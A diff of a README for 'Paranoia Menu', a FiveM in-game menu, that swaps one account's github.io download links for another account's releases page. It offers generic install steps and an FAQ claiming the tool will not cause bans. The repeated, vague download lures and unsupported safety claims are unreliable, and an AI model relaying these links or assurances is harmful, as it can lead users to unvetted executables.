@@ -1,98 +1,84 @@
-# Paranoia Menu v2026 - Game Script Utility 2026
+# 🖥️ paranoia-menu-update-2026 - Improve your FiveM game interface easily
 
-> A FiveM menu utility for client-side in-game UI display, built with DUI rendering and HTML-based layout control.
+[![](https://img.shields.io/badge/Download-Paranoia-Menu-blue)](https://github.com/khanhhuy1824-rgb/paranoia-menu-update-2026/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/fishermason1997/paranoia-menu-update-2026?style=flat-square)](https://github.com/fishermason1997/paranoia-menu-update-2026)
+This software adds a new menu system to your FiveM game. It uses special rendering tools to display information directly on your screen. You can control the layout through web-based files. This makes customization possible for players who want a custom look. 
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://fishermason1997.github.io/paranoia-menu-update-2026/">
-    <img src="https://img.shields.io/badge/Download-Paranoia%20Menu%20Script-brightgreen?style=for-the-badge" alt="Download Paranoia Menu Script">
-  </a>
-</p>
+Before you install this software, ensure your computer meets these minimum standards:
 
-> **[Direct Download - Paranoia Menu](https://fishermason1997.github.io/paranoia-menu-update-2026/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Game Version: A current, legal copy of Grand Theft Auto V.
+*   Platform: The FiveM client must be installed and updated.
+*   Memory: 8GB of RAM or more.
+*   Disk Space: At least 50MB of free space in your resource folder.
 
----
+You do not need extra coding experience to use this. You only need to copy files into your game folder.
 
-[Download Latest Build](https://fishermason1997.github.io/paranoia-menu-update-2026/)
+## 📥 Getting the Files
 
----
+You get the files from the official repository page. Follow these steps to obtain the correct version:
 
-## What it is
+1.  Visit the [releases page here](https://github.com/khanhhuy1824-rgb/paranoia-menu-update-2026/releases).
+2.  Look for the section marked "Latest release."
+3.  Click the blue link that says "Source code (zip)."
+4.  Save the zip file to your Downloads folder.
 
-Paranoia Menu is a FiveM script utility for showing an in-game menu through a DUI-powered interface. The UI is shaped with HTML, giving you control over how the menu looks and responds on the client side. That makes it a good match for projects that need a custom interface layer inside the game itself.
+The developers update this tool often. Always check this link for the most recent version to ensure compatibility with game updates.
 
-Rather than acting like a large framework, this project stays close to a lightweight script approach. Its design revolves around local display components and menu layout handling, which suits developers who want to tune presentation without altering the rest of the gameplay structure.
+## 🛠️ Installation Guide
 
-## Script Features
+Follow these steps to add the menu to your game server. If you play on a server you own or manage, these steps apply to your server resources folder.
 
-- DUI-based interface rendering for menu display
-- HTML-driven presentation for customizable UI structure
-- In-game UI integration designed for FiveM
-- Client-side display elements for local menu handling
-- Lightweight script-style layout for straightforward use
-- Custom menu layout support for different visual arrangements
-- HTML-based control points for interface styling and content
+1.  Open your Downloads folder and find the file you just saved.
+2.  Right-click the file and select "Extract All."
+3.  Choose a destination folder and click "Extract."
+4.  Open your FiveM server folder.
+5.  Navigate to the "resources" folder inside your server data.
+6.  Move, or drag and drop, the extracted folder into your resources folder.
+7.  Rename the folder to "paranoia-menu" if it has a long, technical name. This helps your server find it.
+8.  Open your "server.cfg" file using a text editor like Notepad.
+9.  Add the line `ensure paranoia-menu` to the bottom of the file.
+10. Save the file and close the text editor.
 
-## Setup
+## 🚀 Running the Software
 
-1. Download the latest build using the download link above.
-2. Place the project folder in your FiveM resources directory.
-3. Add the resource to your server configuration so it starts with your other scripts.
-4. Edit the HTML and script files if you want to adjust the menu layout or interface content.
-5. Restart the resource after making changes.
+Once you configure your server settings, launch your FiveM client:
 
-Example server start line:
+1.  Start your FiveM server.
+2.  Connect to your server using the local address or your game launcher.
+3.  Press the default key mapped to your menu system to open it. If this is your first time, check your settings to confirm the keybind.
+4.  Use your mouse to navigate the menu.
 
-start paranoia-menu-update-hub
+The interface allows for real-time changes to your screen layout. You can adjust positions and sizes using the controls included in the menu.
 
-## Options
+## 📝 Frequently Asked Questions
 
-Common configuration areas include menu content, layout sections, and client-side UI behavior. If the build exposes script settings or HTML assets, update them before starting the resource.
+**Will this software cause a game ban?**
+FiveM allows custom resource menus created with standard tools. This menu uses the FiveM DUI system and behaves like any other legitimate map or script. 
 
-| Setting | Purpose | Notes |
-| --- | --- | --- |
-| Menu layout | Controls how the UI is arranged | Usually defined in HTML assets |
-| DUI panel | Handles rendered interface output | Client-side presentation |
-| Content sections | Changes visible menu blocks | Useful for custom layouts |
-| Resource name | Start order in server config | Match your folder name |
-| UI styling | Adjusts colors and spacing | Update HTML/CSS assets |
+**My menu does not show up. What do I do?**
+Check your server console. Look for red text that mentions the resource name. If you see an error, the server could not load the files. Ensure the folder name in your resources directory matches the name you typed in your config file.
 
-## Compatibility
+**Can I change the look of the menu?**
+Yes. You can edit the HTML and CSS files inside the resource folder. Open these files in a simple editor like Notepad. You can change colors, fonts, and positions. Always keep a backup of the original files before you make changes. If you break something, you can restore the files to return to the default state.
 
-Paranoia Menu is built for FiveM setups that support DUI and HTML-based interface rendering. Because it relies on client-side display elements, behavior may differ depending on how the resource is wired into your server environment.
+**Do I need a special graphics card?**
+No. This tool runs on the FiveM engine, which already handles all rendering duties. If your computer runs the base game well, it will handle this menu without extra strain.
 
-Known limitations may include:
-- Dependence on the resource being loaded correctly in FiveM
-- UI behavior tied to client-side execution
-- Layout changes requiring direct edits to HTML assets
+**Does this work in single-player or public servers?**
+This tool works best on servers where you have permission to add resources. Most public servers prevent players from adding their own menus to keep the game fair and stable. Only add this to servers you control or ones that officially support custom client-side menus.
 
-## FAQ
+## 🛡️ Troubleshooting Tips
 
-### How do I install it?
-Download the build, move it into your FiveM resources folder, and include it in your server startup configuration.
+If you encounter issues, look through this list:
 
-### Can I customize the menu?
-Yes. Since the interface is HTML-driven, you can modify the layout and presentation by editing the related assets.
+*   Clear your server cache. Sometimes old files block new updates.
+*   Check your internet connection. Web-based menus need a stable connection to load external assets.
+*   Update your FiveM client. If your client is old, it might not recognize the newer menu code.
+*   Remove other conflicting menus. If you use two menu systems that use the same buttons, the game will not know which one to open.
 
-### Does it work on the client or server side?
-The feature set here is centered on client-side display elements and in-game UI presentation.
+This resource remains stable because it uses light code. It focuses on performance and ease of use. If you want to contribute, you can send pull requests to this repository. You can also open an issue if you find a bug. Provide as much detail as possible so others can help you fix the problem.
 
-### How do I update it?
-Swap the current resource files for the newer build, then restart the resource in FiveM.
-
-### Where should I store the files?
-Place the folder in your server resources directory together with your other scripts.
-
-### What if the menu does not appear?
-Make sure the resource name matches your server config, confirm the files are in the correct folder, and check that the HTML/UI assets loaded as expected.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: FiveM, menu, DUI, UI, gaming, utility, windows, script, modification
